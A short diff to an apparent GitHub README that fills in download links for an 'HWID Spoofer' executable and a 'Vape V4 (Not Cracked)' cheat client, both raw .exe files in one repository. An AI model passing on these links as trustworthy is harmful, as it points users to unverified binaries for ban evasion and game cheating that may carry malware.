@@ -2,10 +2,9 @@
 
 ### Download
 
-- [HWID and Vape V4]()
-
-- [HWID Spoofer]()
-- [Vape V4 (Not Cracked)]()
+- HWID and Vape V4:[![](https://img.shields.io/github/downloads/cubigiabinh/vapev4-hwidspoofer/total?label=download&style=flat-square)]([Release Vape V-allversions + HWID Changer · cubigiabinh/vapev4-hwidspoofer (github.com)](https://github.com/cubigiabinh/vapev4-hwidspoofer/releases/tag/v1))
+- [HWID Spoofer](https://github.com/cubigiabinh/vapev4-hwidspoofer/raw/main/HWIDkey_Changer.exe)
+- [Vape V4 (Not Cracked)](https://github.com/cubigiabinh/vapev4-hwidspoofer/raw/main/v4.exe)
 
 ### Information
 
